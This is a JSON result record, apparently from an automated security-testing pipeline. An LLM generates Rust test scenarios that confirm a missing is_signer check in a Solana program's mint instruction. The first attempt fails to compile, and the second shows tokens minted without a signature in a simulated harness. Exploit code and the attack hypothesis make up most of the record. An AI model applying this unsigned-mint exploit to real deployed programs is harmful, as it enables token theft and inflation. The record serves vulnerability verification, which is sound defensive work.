@@ -1,0 +1,120 @@
+{
+  "category": "SIGNER",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: supply incrementado sem assinatura; balance incrementado sem assinatura",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2373,
+        "completion_tokens": 622,
+        "latency_s": 3.88
+      },
+      "raw": "{\n  \"plan\": \"O ataque explora a ausência de verificação de assinatura na instrução `mint`. O cenário monta uma conta `ledger` controlada pelo atacante (dados com supply e balance iniciais em zero) e chama `mint` com um valor arbitrário, sem que a conta `ledger` assine a transação. O baseline usa a mesma instrução, mas com a conta `ledger` assinando, para provar que o cenário está correto. O efeito medido é que, mesmo sem assinatura, o saldo e o supply da conta `ledger` são incrementados pelo valor mintado, demonstrando a vulnerabilidade.\",\n  \"scenario\": \"let ledger_key = Pubkey::new_unique();\\nlet mut ledger_data = vec![0u8; 56];\\n// supply em 40..48 e balance em 48..56 já são zero\\nlet ledger_account = account(&env.program_id, &ledger_data, None);\\n\\n// Baseline: mint com a conta ledger assinando (uso legítimo)\\nlet ix_baseline = env.raw_ix(&[IX_MINT, 10, 0, 0, 0, 0, 0, 0, 0], &[\\n    AccountMeta::new(ledger_key, true),\\n]);\\nlet contas_baseline = vec![\\n    (ledger_key, ledger_account.clone()),\\n];\\nlet r_baseline = env.baseline(\\\"mint legítimo com assinatura\\\", &ix_baseline, &contas_baseline);\\n\\n// Ataque: mint sem a conta ledger assinar\\nlet ix_attack = env.raw_ix(&[IX_MINT, 100, 0, 0, 0, 0, 0, 0, 0], &[\\n    AccountMeta::new(ledger_key, false),\\n]);\\nlet contas_attack = vec![\\n    (ledger_key, ledger_account),\\n];\\nlet r_attack = env.attack(\\\"mint sem assinatura\\\", &ix_attack, &contas_attack);\\n\\nif r_attack.program_result == ProgramResult::Success {\\n    let ledger_after = after(&r_attack, &ledger_key);\\n    let supply_after = read_u64(ledger_after.data(), 40);\\n    let balance_after = read_u64(ledger_after.data(), 48);\\n    env.effect(\\\"supply incrementado sem assinatura\\\", supply_after == 100);\\n    env.effect(\\\"balance incrementado sem assinatura\\\", balance_after == 100);\\n}\"\n}",
+      "plan": "O ataque explora a ausência de verificação de assinatura na instrução `mint`. O cenário monta uma conta `ledger` controlada pelo atacante (dados com supply e balance iniciais em zero) e chama `mint` com um valor arbitrário, sem que a conta `ledger` assine a transação. O baseline usa a mesma instrução, mas com a conta `ledger` assinando, para provar que o cenário está correto. O efeito medido é que, mesmo sem assinatura, o saldo e o supply da conta `ledger` são incrementados pelo valor mintado, demonstrando a vulnerabilidade.",
+      "scenario": "let ledger_key = Pubkey::new_unique();\nlet mut ledger_data = vec![0u8; 56];\n// supply em 40..48 e balance em 48..56 já são zero\nlet ledger_account = account(&env.program_id, &ledger_data, None);\n\n// Baseline: mint com a conta ledger assinando (uso legítimo)\nlet ix_baseline = env.raw_ix(&[IX_MINT, 10, 0, 0, 0, 0, 0, 0, 0], &[\n    AccountMeta::new(ledger_key, true),\n]);\nlet contas_baseline = vec![\n    (ledger_key, ledger_account.clone()),\n];\nlet r_baseline = env.baseline(\"mint legítimo com assinatura\", &ix_baseline, &contas_baseline);\n\n// Ataque: mint sem a conta ledger assinar\nlet ix_attack = env.raw_ix(&[IX_MINT, 100, 0, 0, 0, 0, 0, 0, 0], &[\n    AccountMeta::new(ledger_key, false),\n]);\nlet contas_attack = vec![\n    (ledger_key, ledger_account),\n];\nlet r_attack = env.attack(\"mint sem assinatura\", &ix_attack, &contas_attack);\n\nif r_attack.program_result == ProgramResult::Success {\n    let ledger_after = after(&r_attack, &ledger_key);\n    let supply_after = read_u64(ledger_after.data(), 40);\n    let balance_after = read_u64(ledger_after.data(), 48);\n    env.effect(\"supply incrementado sem assinatura\", supply_after == 100);\n    env.effect(\"balance incrementado sem assinatura\", balance_after == 100);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0425]: cannot find value `IX_MINT` in this scope\n  --> tests/attempt.rs:15:36\n   |\n15 |     let ix_baseline = env.raw_ix(&[IX_MINT, 10, 0, 0, 0, 0, 0, 0, 0], &[\n   |                                    ^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `IX_MINT` in this scope\n  --> tests/attempt.rs:24:34\n   |\n24 |     let ix_attack = env.raw_ix(&[IX_MINT, 100, 0, 0, 0, 0, 0, 0, 0], &[\n   |                                  ^^^^^^^ not found in this scope\n\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:15:71\n    |\n 15 |       let ix_baseline = env.raw_ix(&[IX_MINT, 10, 0, 0, 0, 0, 0, 0, 0], &[\n    |  ___________________________------______________________________________^\n    | |                           |\n    | |                           arguments to this method are incorrect\n 16 | |         AccountMeta::new(ledger_key, true),\n 17 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 1]`\n    |\n    = note: expected struct `Vec<dynamic_harness::AccountMeta>`\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:24:70\n    |\n 24 |       let ix_attack = env.raw_ix(&[IX_MINT, 100, 0, 0, 0, 0, 0, 0, 0], &[\n    |  _________________________------_______________________________________^\n    | |                         |\n    | |                         arguments to this method are incorrect\n 25 | |         AccountMeta::new(ledger_key, false),\n 26 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 1]`\n    |\n    = note: expected struct `Vec<dynamic_harness::AccountMeta>`\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 4 previous errors",
+        "elapsed_s": 0.7
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0425]: cannot find value `IX_MINT` in this scope\n  --> tests/attempt.rs:15:36\n   |\n15 |     let ix_baseline = env.raw_ix(&[IX_MINT, 10, 0, 0, 0, 0, 0, 0, 0], &[\n   |                                    ^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `IX_MINT` in this scope\n  --> tests/attempt.rs:24:34\n   |\n24 |     let ix_attack = env.raw_ix(&[IX_MINT, 100, 0, 0, 0, 0, 0, 0, 0], &[\n   |                                  ^^^^^^^ not found in this scope\n\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:15:71\n    |\n 15 |       let ix_baseline = env.raw_ix(&[IX_MINT, 10, 0, 0, 0, 0, 0, 0, 0], &[\n    |  ___________________________------______________________________________^\n    | |                           |\n    | |                           arguments to this method are incorrect\n 16 | |         AccountMeta::new(ledger_key, true),\n 17 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 1]`\n    |\n    = note: expected struct `Vec<dynamic_harness::AccountMeta>`\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:24:70\n    |\n 24 |       let ix_attack = env.raw_ix(&[IX_MINT, 100, 0, 0, 0, 0, 0, 0, 0], &[\n    |  _________________________------_______________________________________^\n    | |                         |\n    | |                         arguments to this method are incorrect\n 25 | |         AccountMeta::new(ledger_key, false),\n 26 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 1]`\n    |\n    = note: expected struct `Vec<dynamic_harness::AccountMeta>`\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 4 previous errors"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3367,
+        "completion_tokens": 562,
+        "latency_s": 3.0
+      },
+      "raw": "{\"plan\": \"Preparo uma conta ledger com 56 bytes zerados (supply em 40..48, balance em 48..56) pertencente ao programa. O baseline chama mint com a conta ledger assinando (uso legitimo) e deve ter sucesso. O ataque chama mint com amount=100 sem a conta ledger assinar; se o programa nao verificar is_signer, o supply e o balance serao incrementados. O efeito mede que supply e balance chegaram a 100 sem assinatura.\", \"scenario\": \"let ledger_key = Pubkey::new_unique();\\nlet ledger_data = vec![0u8; 56];\\nlet ledger_account = account(&env.program_id, &ledger_data, None);\\n\\n// Baseline: mint com a conta ledger assinando (uso legitimo)\\nlet ix_baseline = env.raw_ix(\\n    &[0u8, 10, 0, 0, 0, 0, 0, 0, 0],\\n    vec![AccountMeta::new(ledger_key, true)],\\n);\\nlet contas_baseline = vec![(ledger_key, ledger_account.clone())];\\nlet _r_baseline = env.baseline(\\\"mint legitimo com assinatura\\\", &ix_baseline, &contas_baseline);\\n\\n// Ataque: mint sem a conta ledger assinar\\nlet ix_attack = env.raw_ix(\\n    &[0u8, 100, 0, 0, 0, 0, 0, 0, 0],\\n    vec![AccountMeta::new(ledger_key, false)],\\n);\\nlet contas_attack = vec![(ledger_key, ledger_account)];\\nlet r_attack = env.attack(\\\"mint sem assinatura\\\", &ix_attack, &contas_attack);\\n\\nif r_attack.program_result == ProgramResult::Success {\\n    let ledger_after = after(&r_attack, &ledger_key);\\n    let supply_after = read_u64(ledger_after.data(), 40);\\n    let balance_after = read_u64(ledger_after.data(), 48);\\n    env.effect(\\\"supply incrementado sem assinatura\\\", supply_after == 100);\\n    env.effect(\\\"balance incrementado sem assinatura\\\", balance_after == 100);\\n}\"}",
+      "plan": "Preparo uma conta ledger com 56 bytes zerados (supply em 40..48, balance em 48..56) pertencente ao programa. O baseline chama mint com a conta ledger assinando (uso legitimo) e deve ter sucesso. O ataque chama mint com amount=100 sem a conta ledger assinar; se o programa nao verificar is_signer, o supply e o balance serao incrementados. O efeito mede que supply e balance chegaram a 100 sem assinatura.",
+      "scenario": "let ledger_key = Pubkey::new_unique();\nlet ledger_data = vec![0u8; 56];\nlet ledger_account = account(&env.program_id, &ledger_data, None);\n\n// Baseline: mint com a conta ledger assinando (uso legitimo)\nlet ix_baseline = env.raw_ix(\n    &[0u8, 10, 0, 0, 0, 0, 0, 0, 0],\n    vec![AccountMeta::new(ledger_key, true)],\n);\nlet contas_baseline = vec![(ledger_key, ledger_account.clone())];\nlet _r_baseline = env.baseline(\"mint legitimo com assinatura\", &ix_baseline, &contas_baseline);\n\n// Ataque: mint sem a conta ledger assinar\nlet ix_attack = env.raw_ix(\n    &[0u8, 100, 0, 0, 0, 0, 0, 0, 0],\n    vec![AccountMeta::new(ledger_key, false)],\n);\nlet contas_attack = vec![(ledger_key, ledger_account)];\nlet r_attack = env.attack(\"mint sem assinatura\", &ix_attack, &contas_attack);\n\nif r_attack.program_result == ProgramResult::Success {\n    let ledger_after = after(&r_attack, &ledger_key);\n    let supply_after = read_u64(ledger_after.data(), 40);\n    let balance_after = read_u64(ledger_after.data(), 48);\n    env.effect(\"supply incrementado sem assinatura\", supply_after == 100);\n    env.effect(\"balance incrementado sem assinatura\", balance_after == 100);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "mint legitimo com assinatura",
+            "result": "Success",
+            "compute_units": 224,
+            "account_flags": "sw",
+            "ix_head": "000a000000000000",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 56,
+                "head": "0000000000000000",
+                "digest": "d4817aa5497628e7",
+                "post": "000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000a00000000000000"
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "mint sem assinatura",
+            "result": "Success",
+            "compute_units": 224,
+            "account_flags": "-w",
+            "ix_head": "0064000000000000",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 56,
+                "head": "0000000000000000",
+                "digest": "d4817aa5497628e7",
+                "post": "0000000000000000000000000000000000000000000000000000000000000000000000000000000064000000000000006400000000000000"
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "supply incrementado sem assinatura",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "balance incrementado sem assinatura",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 224 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 224 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: supply incrementado sem assinatura; balance incrementado sem assinatura"
+    }
+  ],
+  "case_id": "SSP-03-P-V1",
+  "static_finding": {
+    "category": "SIGNER",
+    "confidence": "high",
+    "evidence": "fn mint(accounts: &[AccountInfo], amount: u64) -> ProgramResult {\n    let ledger = &accounts[0];\n    let mut data = ledger.try_borrow_mut_data()?;",
+    "explanation": "A instrucao `mint` cria/incrementa saldo e supply sem exigir que nenhuma conta assine a transacao. Nao ha verificacao de `is_signer` em `accounts[0]` nem em qualquer outra conta, permitindo que qualquer pessoa crie moedas.",
+    "attack_hypothesis": "O atacante envia uma transacao chamando `mint` com `amount` arbitrario e uma conta `ledger` que ele controla, sem precisar assinar como autoridade, mintando tokens para si mesmo."
+  }
+}
